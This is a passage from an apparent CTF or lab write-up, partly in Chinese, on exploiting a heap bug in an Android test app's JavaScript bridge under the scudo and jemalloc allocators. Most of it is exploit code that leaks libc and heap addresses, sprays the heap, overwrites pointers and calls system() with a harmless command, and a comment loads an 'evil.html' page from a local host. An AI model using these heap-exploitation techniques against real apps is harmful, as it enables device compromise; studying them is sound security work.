</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_addr </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_addr </span><span style="color:#c0c5ce;">== -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">leak_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">get_libc_addr</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">leak_addr</span><span style="color:#c0c5ce;">&gt;&gt;&gt;</span><span style="color:#d08770;">24 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0xb6</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">libc_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">leak_addr</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">unlink_attack</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_addr</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">libhello_addr</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">&lt;/</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#65737e;">&lt;!-- watch *0xb6fb2000 --&gt;
</span><span style="color:#65737e;">&lt;!-- vmmap 0xa8c13000-0x3150000 --&gt;
</span><span style="color:#65737e;">&lt;!-- am start -n com.avss.testallocator/.MainActivity -e url http://192.168.130.133:8000/evil.html 0x1c630 --&gt;
</span><span style="color:#65737e;">&lt;!-- 0x3630 --&gt;
</span></pre>
<h2 id="jemalloc">jemalloc</h2><p>思路和 scudo 类似，Android8不支持<code>BigInt</code>语法，直接按照32bit处理
另外处理中数据时注意移位保证无符号数</p>
<p>jemalloc没有chunk头，没法直接确定对应内存大小，占位前直接看libc.so的fopen函数里实际申请大小为0xA6F</p>
<p>在使用FileBase类占位空闲内存时不能统一一块释放，采用释放一个调用一次openfile，然后遍历可控堆块判断是否占位成功，之后劫持指针布置参数即可</p>
<h3 id="exp">exp</h3><pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">&lt;</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(number) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">number </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">number</span><span style="color:#c0c5ce;">&gt;&gt;&gt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">number</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.length % </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">!== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39; + </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.length &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">padStart</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.length &gt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">bytes </span><span style="color:#c0c5ce;">= [];
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">+= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">reverse</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(&#39;&#39;).</span><span style="color:#8fa1b3;">toUpperCase</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">hexToLE32</span><span style="color:#c0c5ce;">(hexString){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">--) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">= (</span><span style="color:#bf616a;">ret</span><span style="color:#c0c5ce;">&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)&gt;&gt;&gt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">|= </span><span style="color:#96b5b4;">parseInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hexString</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">) &gt;&gt;&gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">ret</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(s, n){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= &#39;&#39;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++)
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">s</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">convertToASCII</span><span style="color:#c0c5ce;">(str) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">= &quot;&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.length; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">result</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">debug1_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">49</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">GG</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x11223344</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x55667788</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">s_index </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">.length == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">s_index </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">AB</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">+&quot;</span><span style="color:#96b5b4;">\x61</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0xa6f</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">GG</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0xa6f</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_base_low </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_base_high </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">heap_addr_low </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">heap_addr_high </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">control_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cnt </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_base_low </span><span style="color:#c0c5ce;">== -</span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">&amp;&amp; </span><span style="color:#bf616a;">libc_base_high</span><span style="color:#c0c5ce;">== -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">%</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">openfile</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">D</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">+=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">content </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa6f</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">check_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((</span><span style="color:#bf616a;">check_ct</span><span style="color:#c0c5ce;">&amp;</span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x1c0</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">control_idx </span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">libc_base_low </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">check_ct</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x731c0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">libc_base_high </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">heap_addr_low </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">))-</span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">heap_addr_high </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">check_ct</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                    +</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_base_low</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_base_high</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                    +</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">heap_addr_low</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">heap_addr_high</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                    +</span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x41424344</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">chunk_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa08</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">system_addr_low </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base_low</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x64144</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">system_addr_high </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base_high</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cmd </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">echo hacked &gt; /data/data/com.avss.testallocator/files/tmp/hacked</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">chunk_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        + </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">heap_addr_low</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0xa8</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">heap_addr_high</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        + </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">system_addr_low</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">LEToHex32</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">system_addr_high</span><span style="color:#c0c5ce;">) + </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">((</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">)*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.length*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
